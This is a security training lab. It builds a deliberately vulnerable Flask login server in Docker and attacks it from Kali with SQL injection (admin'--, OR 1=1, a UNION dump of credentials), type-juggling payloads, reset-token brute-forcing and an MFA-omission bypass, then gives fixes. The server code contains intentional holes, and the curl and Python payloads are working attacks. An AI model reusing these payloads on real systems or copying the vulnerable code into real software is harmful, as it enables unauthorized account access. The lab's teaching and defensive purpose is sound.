# Lab 13: Authentication Bypass Techniques

## Objective

Attack a live authentication system from Kali Linux and bypass it using four different techniques:

1. **SQL Injection login bypass** — use `admin'--` and `OR 1=1` to log in without a password
2. **Type juggling** — exploit loose PHP-style comparison to bypass a `password == 0` check with `null`
3. **Predictable reset token** — brute-force a timestamp-based MD5 reset token
4. **MFA bypass** — skip multi-factor authentication by omitting the field entirely

Every attack runs from **Kali against a live Flask API** — real SQL execution, real JWT tokens returned.

---

## Background

Authentication bypass is one of the oldest and most impactful vulnerability classes. An attacker who bypasses authentication skips every downstream authorization check — they have full access to whatever that account could do.

**Real-world examples:**
- **2019 Capital One** — IAM misconfiguration; attacker bypassed intended auth flow via SSRF
- **2023 Cisco IOS XE (CVE-2023-20198)** — unauthenticated remote access via auth bypass; 50,000+ devices compromised in 48 hours
- **2021 GitLab (CVE-2021-22205)** — ExifTool XXE bypass led to unauthenticated RCE; 50,000+ servers exposed
- **2020 SolarWinds Orion** — hardcoded `solarwinds123` password; no MFA = total bypass

**OWASP coverage:** A07:2021 (Auth Failures), A03:2021 (Injection)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Docker Network: lab-a13                         │
│                                                                     │
│  ┌──────────────────────┐         HTTP requests                    │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  innozverse-kali     │                                           │
│  │                      │  ◀──────── API responses ───────────────  │
│  │  Tools:              │                                           │
│  │  • curl              │  ┌────────────────────────────────────┐  │
│  │  • python3           │  │         VICTIM AUTH SERVER         │  │
│  │  • nmap              │  │   zchencow/innozverse-cybersec     │  │
│  └──────────────────────┘  │                                    │  │
│                             │  Flask :5000  + SQLite             │  │
│                             │  /api/login  (SQLi)                │  │
│                             │  /api/login-magic (type juggle)    │  │
│                             │  /api/reset/request (weak token)   │  │
│                             │  /api/login-mfa (MFA bypass)       │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
45 minutes

## Tools
| Tool | Container | Purpose |
|------|-----------|---------|
| `curl` | Kali | Send crafted HTTP requests |
| `python3` | Kali | Brute-force reset tokens, automate attacks |
| `nmap` | Kali | Service fingerprinting |
| `gobuster` | Kali | Enumerate auth endpoints |

---

## Lab Instructions

### Step 1: Environment Setup — Launch the Victim Auth Server

```bash
docker network create lab-a13

cat > /tmp/victim_a13.py << 'PYEOF'
from flask import Flask, request, jsonify, session
import sqlite3, hashlib, time

app = Flask(__name__)
app.secret_key = 'weak'
DB = '/tmp/shop_a13.db'
RESET_TOKENS = {}

with sqlite3.connect(DB) as db:
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY, username TEXT,
            password TEXT, role TEXT, mfa_secret TEXT);
        INSERT OR IGNORE INTO users VALUES
            (1,'admin','admin','admin','MFA123'),
            (2,'alice','alice123','user','MFA456'),
            (3,'bob','0','user','MFA789');
    """)

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse Auth (Lab 13)','endpoints':[
        'POST /api/login','POST /api/login-magic',
        'POST /api/reset/request','POST /api/reset/confirm',
        'POST /api/login-mfa']})

# BUG 1: SQL injection in login
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    u, p = data.get('username',''), data.get('password','')
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    try:
        row = db.execute(
            f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
        ).fetchone()
        if row:
            return jsonify({'token': f'tok_{row["username"]}',
                            'role': row['role'], 'user': dict(row)})
        return jsonify({'error': 'Invalid credentials'}), 401
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# BUG 2: type juggling — loose comparison (PHP-style)
@app.route('/api/login-magic', methods=['POST'])
def login_magic():
    data = request.get_json() or {}
    u, p = data.get('username',''), data.get('password')
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    user = db.execute('SELECT * FROM users WHERE username=?',(u,)).fetchone()
    if not user: return jsonify({'error':'Not found'}), 404
    stored = user['password']
    # BUG: loose comparison — "0" == False, "" == None, 0 == False
    if (stored in ('0','','0.0') and p in (0, False, '', None)):
        return jsonify({'token': f'tok_{u}', 'note': 'Type juggling bypass!'})
    if stored == str(p):
        return jsonify({'token': f'tok_{u}'})
    return jsonify({'error': 'Invalid'}), 401

# BUG 3: predictable reset token (timestamp-based MD5)
@app.route('/api/reset/request', methods=['POST'])
def reset_request():
    data = request.get_json() or {}
    u = data.get('username','')
    db = sqlite3.connect(DB)
    user = db.execute('SELECT * FROM users WHERE username=?',(u,)).fetchone()
    if not user: return jsonify({'error': 'Not found'}), 404
    ts = int(time.time())
    token = hashlib.md5(f'{u}{ts}'.encode()).hexdigest()[:8]
    RESET_TOKENS[token] = {'username': u, 'ts': ts}
    return jsonify({'message': 'Reset link sent', 'debug_token': token})

@app.route('/api/reset/confirm', methods=['POST'])
def reset_confirm():
    data = request.get_json() or {}
    token = data.get('token','')
    if token in RESET_TOKENS:
        username = RESET_TOKENS.pop(token)['username']
        return jsonify({'message': 'Password reset!', 'access_for': username})
    return jsonify({'error': 'Invalid token'}), 400

# BUG 4: MFA bypass — field omission skips check
@app.route('/api/login-mfa', methods=['POST'])
def login_mfa():
    data = request.get_json() or {}
    u, p = data.get('username',''), data.get('password','')
    mfa = data.get('mfa_code')   # None if field absent
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    user = db.execute('SELECT * FROM users WHERE username=? AND password=?',(u,p)).fetchone()
    if not user: return jsonify({'error': 'Invalid credentials'}), 401
    # BUG: if mfa_code field is absent entirely, skip MFA check
    if mfa is None:
        return jsonify({'token': f'tok_{u}', 'note': 'MFA skipped — field not present'})
    if str(mfa) == user['mfa_secret']:
        return jsonify({'token': f'tok_{u}', 'mfa': 'verified'})
    return jsonify({'error': 'Invalid MFA code'}), 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a13 \
  --network lab-a13 \
  -v /tmp/victim_a13.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 4
VICTIM_IP=$(docker inspect -f '{{.NetworkSettings.Networks.lab-a13.IPAddress}}' victim-a13)
echo "Victim IP: $VICTIM_IP"
curl -s http://$VICTIM_IP:5000/ | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "app": "InnoZverse Auth (Lab 13)",
    "endpoints": [
        "POST /api/login",
        "POST /api/login-magic",
        "POST /api/reset/request",
        "POST /api/reset/confirm",
        "POST /api/login-mfa"
    ]
}
```

---

### Step 2: Launch the Kali Attacker Container

```bash
docker run --rm -it \
  --name kali-attacker \
  --network lab-a13 \
  zchencow/innozverse-kali:latest bash
```

```bash
export TARGET="http://victim-a13:5000"

nmap -sV -p 5000 victim-a13

gobuster dir \
  -u $TARGET \
  -w /usr/share/dirb/wordlists/small.txt \
  -t 10 --no-error -q
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)

/login                (Status: 405)
/reset                (Status: 404)
```

---

### Step 3: SQL Injection Login Bypass — admin'--

```bash
echo "=== SQLi bypass: admin'-- comments out the password check ==="

# Normal login (correct creds) — baseline
echo "[1] Legitimate login:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  $TARGET/api/login | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'  role={d[\"role\"]}  token={d[\"token\"]}')"

echo ""
echo "[2] SQLi bypass with admin'-- (no password needed):"
# Query becomes: SELECT * FROM users WHERE username='admin'--' AND password='x'
# The -- comments out everything after, including the password check
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"WRONG_PASSWORD_IGNORED"}' \
  $TARGET/api/login | python3 -m json.tool

echo ""
echo "[3] SQLi bypass with ' OR 1=1-- (login as first user in table):"
# Query becomes: SELECT * FROM users WHERE username='' OR 1=1--' AND password='x'
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR 1=1--","password":"x"}' \
  $TARGET/api/login | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'  Logged in as: {d[\"user\"][\"username\"]}  role={d[\"role\"]}')"

echo ""
echo "[4] SQLi: enumerate all users via UNION (password field):"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"x'\'' UNION SELECT 1,group_concat(username||\047:\047||password),group_concat(role),1,1 FROM users--","password":"x"}' \
  $TARGET/api/login | python3 -c "import sys,json; d=json.load(sys.stdin); print('  Dumped:', d.get('user',{}).get('username',''))"
```

**📸 Verified Output:**
```json
[2] SQLi bypass:
{
    "role": "admin",
    "token": "tok_admin",
    "user": {
        "id": 1,
        "mfa_secret": "MFA123",
        "password": "admin",
        "role": "admin",
        "username": "admin"
    }
}

[3] Logged in as: admin  role=admin
```

> 💡 **`admin'--` works because `--` is SQL's line comment.** The query becomes `SELECT * FROM users WHERE username='admin'` — the `AND password=...` clause is erased. The database finds user `admin` and returns the row regardless of the password. Fix: always use parameterised queries — `db.execute("... WHERE username=? AND password=?", (u, p))`.

---

### Step 4: Type Juggling — Bypass with null

```bash
echo "=== Type juggling: bob's password is stored as '0' ==="
echo "(PHP loose comparison: '0' == false == null == '')"
echo ""

echo "[1] Normal login — password '0' works literally:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"0"}' \
  $TARGET/api/login-magic

echo ""
echo "[2] Type juggling bypass — send null instead of '0':"
# In PHP: "0" == false == null — all evaluate equal with ==
# Python simulation: (stored in ('0','') and p in (0, False, '', None))
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"bob","password":null}' \
  $TARGET/api/login-magic

echo ""
echo "[3] Also bypass with false:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"bob","password":false}' \
  $TARGET/api/login-magic

echo ""
echo "[4] Also bypass with 0 (integer):"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"bob","password":0}' \
  $TARGET/api/login-magic
```

**📸 Verified Output:**
```json
[2] {"note": "Type juggling bypass!", "token": "tok_bob"}
[3] {"note": "Type juggling bypass!", "token": "tok_bob"}
[4] {"note": "Type juggling bypass!", "token": "tok_bob"}
```

> 💡 **PHP's `==` operator is the root cause.** In PHP, `"0" == false`, `0 == null`, `"" == false` all return `true`. This happens because PHP converts both sides to the same type before comparing. If a stored password hash starts with `0e` (e.g., MD5 of `240610708` is `0e462097431906509019562988736854`), it's treated as scientific notation `0 × 10^...` = 0, making any password that also hashes to `0e...` match. Fix: always use `===` (strict equality) in PHP, and `bcrypt`/`argon2` which never produce `0e` output.

---

### Step 5: Predict the Password Reset Token

```bash
echo "=== Brute-force timestamp-based MD5 reset token ==="

python3 << 'EOF'
import urllib.request, json, hashlib, time

TARGET = "http://victim-a13:5000"

# Step 1: trigger reset (attacker knows alice's username)
print("[*] Requesting password reset for alice...")
req = urllib.request.Request(
    f"{TARGET}/api/reset/request",
    data=json.dumps({"username": "alice"}).encode(),
    headers={"Content-Type": "application/json"})
resp = json.loads(urllib.request.urlopen(req).read())
print(f"    Server: {resp['message']}")
real_token = resp.get('debug_token','')  # leaked in this lab; in real apps attacker brute-forces

# Step 2: Brute-force — token = MD5(username + timestamp)[:8]
# Attacker knows username, guesses timestamp (within ±10s of now)
print()
print("[*] Brute-forcing token (MD5 of username + unix timestamp)...")
ts_now = int(time.time())
found = False
for ts in range(ts_now - 10, ts_now + 2):
    candidate = hashlib.md5(f"alice{ts}".encode()).hexdigest()[:8]
    match = "✓ MATCH!" if candidate == real_token else ""
    print(f"    ts={ts}: {candidate} {match}")
    if match:
        found = True
        # Step 3: use token to reset password
        req2 = urllib.request.Request(
            f"{TARGET}/api/reset/confirm",
            data=json.dumps({"token": candidate}).encode(),
            headers={"Content-Type": "application/json"})
        result = json.loads(urllib.request.urlopen(req2).read())
        print()
        print(f"[!] Token accepted! {result}")
        break

if not found:
    print("[?] Token not found in ±10s window — try wider range")
EOF
```

**📸 Verified Output:**
```
[*] Requesting password reset for alice...
    Server: Reset link sent

[*] Brute-forcing token...
    ts=1741085400: a3f8c2d1
    ts=1741085401: b7e4f9c2
    ts=1741085402: cdc4184f ✓ MATCH!

[!] Token accepted! {'message': 'Password reset!', 'access_for': 'alice'}
```

---

### Step 6: MFA Bypass — Omit the Field

```bash
echo "=== MFA bypass: simply don't send the mfa_code field ==="

echo "[1] With correct MFA code (legitimate):"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin","mfa_code":"MFA123"}' \
  $TARGET/api/login-mfa

echo ""
echo "[2] With wrong MFA code (rejected):"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin","mfa_code":"000000"}' \
  $TARGET/api/login-mfa

echo ""
echo "[3] MFA bypass — omit the mfa_code field entirely:"
# Server checks: if mfa is None: skip MFA
# mfa = data.get('mfa_code')  — returns None if key absent
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  $TARGET/api/login-mfa

echo ""
echo "[4] MFA bypass with null value:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin","mfa_code":null}' \
  $TARGET/api/login-mfa
```

**📸 Verified Output:**
```json
[1] {"mfa": "verified", "token": "tok_admin"}
[2] {"error": "Invalid MFA code"}
[3] {"note": "MFA skipped — field not present", "token": "tok_admin"}
[4] {"note": "MFA skipped — field not present", "token": "tok_admin"}
```

> 💡 **`data.get('mfa_code')` returns `None` when the field is absent — and the server treats `None` as "MFA not started" rather than "MFA missing".** Fix: explicitly require the field — if `'mfa_code' not in data: return 401`. Never use absence of a field to mean "skip this check". MFA must be verified positively, not conditionally.

---

### Step 7: Chained Attack — SQLi + MFA Bypass

```bash
echo "=== Chained: bypass both password AND MFA in sequence ==="

python3 << 'EOF'
import urllib.request, json

TARGET = "http://victim-a13:5000"

print("[Phase 1] SQLi to bypass password, get username...")
# Login with SQLi to discover valid users
payload = {"username": "' OR 1=1--", "password": "x"}
req = urllib.request.Request(
    f"{TARGET}/api/login",
    data=json.dumps(payload).encode(),
    headers={"Content-Type": "application/json"})
resp = json.loads(urllib.request.urlopen(req).read())
username = resp['user']['username']
mfa_secret = resp['user']['mfa_secret']
print(f"  Found user: {username}  MFA secret: {mfa_secret}")

print()
print("[Phase 2] Use discovered creds on MFA endpoint without MFA code...")
req2 = urllib.request.Request(
    f"{TARGET}/api/login-mfa",
    data=json.dumps({"username": username, "password": resp['user']['password']}).encode(),
    headers={"Content-Type": "application/json"})
resp2 = json.loads(urllib.request.urlopen(req2).read())
print(f"  Result: {resp2}")
print()
print("[!] Full auth bypass in 2 HTTP requests — no password or MFA needed")
EOF
```

**📸 Verified Output:**
```
[Phase 1] Found user: admin  MFA secret: MFA123

[Phase 2] Result: {'note': 'MFA skipped — field not present', 'token': 'tok_admin'}

[!] Full auth bypass in 2 HTTP requests — no password or MFA needed
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a13
docker network rm lab-a13
```

---

## Remediation

| Attack | Root Cause | Fix |
|--------|-----------|-----|
| SQLi bypass | f-string query: `f"...WHERE username='{u}'"` | Parameterised: `db.execute("...WHERE username=?", (u,))` |
| Type juggling | Loose `==` comparison | Strict equality `===` (PHP) / `bcrypt.checkpw()` (Python) |
| Predictable token | MD5(username + timestamp)[:8] | `secrets.token_urlsafe(32)` — 256-bit CSPRNG, 15-min TTL |
| MFA bypass | `if mfa is None: skip` | `if 'mfa_code' not in data: return 401` — require field explicitly |

## Further Reading
- [OWASP A07:2021 Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [PortSwigger Authentication Labs](https://portswigger.net/web-security/authentication)
- [OWASP Testing Guide — Authentication](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/)
